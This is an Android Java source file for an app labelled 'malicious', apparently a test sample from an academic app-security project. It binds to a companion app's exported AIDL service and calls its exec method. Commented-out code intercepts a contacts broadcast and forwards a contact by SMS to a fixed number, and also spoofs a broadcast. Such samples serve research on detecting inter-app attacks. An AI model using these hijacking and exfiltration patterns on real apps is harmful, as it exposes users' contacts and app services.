package edu.ksu.cs.santos.malicious.hijackgreetingsactivity;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.IBinder;
import android.os.Messenger;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import edu.ksu.cs.santos.benign.sendgreetings.ITestInterface;


public class MainActivity extends AppCompatActivity {

    ITestInterface mService = null;
    private final String TAG = "MainActivity";

    private ServiceConnection serviceConnection1 = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mService = ITestInterface.Stub.asInterface(service);
            try{
                String str = mService.exec("AIDL works!");
                Log.d(TAG,str);
            }
            catch(RemoteException re){
                re.printStackTrace();
            }
            catch(Exception e){
                e.printStackTrace();
            }

        }

        @Override
        public void onServiceDisconnected(ComponentName name) {

        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent i = new Intent();
        i.setClassName("edu.ksu.cs.santos.benign.sendgreetings","edu.ksu.cs.santos.benign.sendgreetings.ITestService");
        bindService(i,serviceConnection1,Context.BIND_AUTO_CREATE);
    }

    @Override
    protected void onDestroy(){
        //unregisterReceiver(br);
        super.onDestroy();
    }


}



    /*  private Messenger messenger = null;
        private ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            messenger = new Messenger(service);

            Toast.makeText(getApplicationContext(),"Component name = " + name,Toast.LENGTH_LONG).show();
            try{
                service.queryLocalInterface(service.getInterfaceDescriptor());
                Class<?> cls = Class.forName(name.getClassName(),true,null);
                Object obj = cls.newInstance();
                Method m = cls.getMethod("isPhoneUSA",new Class[] {String.class});
                Boolean r = (Boolean) m.invoke(obj,new Object[] {new String("7855629011")});
                Toast.makeText(getApplicationContext(),"isPhoneUsa = " + r,Toast.LENGTH_LONG).show();
            }
            catch(RemoteException re){
                re.printStackTrace();
            }
            catch(SecurityException se){
                se.printStackTrace();
            }
            catch(ClassNotFoundException ce){
                ce.printStackTrace();
                Toast.makeText(getApplicationContext(),"Class not found",Toast.LENGTH_LONG).show();
            }
            catch(InstantiationException ie){
                ie.printStackTrace();
            }
            catch(IllegalAccessException ia){
                ia.printStackTrace();
            }
            catch(NoSuchMethodException nse){
                nse.printStackTrace();
            }
            catch(InvocationTargetException ite){
                ite.printStackTrace();
            }
            catch(NullPointerException npe){
                npe.printStackTrace();
            }
            catch (Exception e){
                e.printStackTrace();
                Toast.makeText(getApplicationContext(),"Exception",Toast.LENGTH_SHORT).show();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            messenger = null;
        }
    };


    //Intent i = getIntent();
        //String data = i.getStringExtra("Phone");
        //Toast.makeText(this,data,Toast.LENGTH_SHORT).show();

        /*br = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                ArrayList<String> contacts = intent.getStringArrayListExtra("contacts");
                //Toast.makeText(getApplicationContext(),msg,Toast.LENGTH_SHORT).show();
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("sms:" + "29323"));
                i.putExtra("sms_body", contacts.get(0));
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            }
        };
        registerReceiver(br,new IntentFilter("edu.ksu.cs.santos.benign.sendgreetings.contactsRecvr"));

        ArrayList<String> malContacts = new ArrayList<>();
        malContacts.add("4444");
        malContacts.add("5555");
        //Intent intent = new Intent("edu.ksu.cs.santos.benign.sendgreetings.contactsRecvr");
        Intent intent = new Intent();
        intent.setPackage("");
        intent.putStringArrayListExtra("contacts",malContacts);
        sendBroadcast(intent);*/
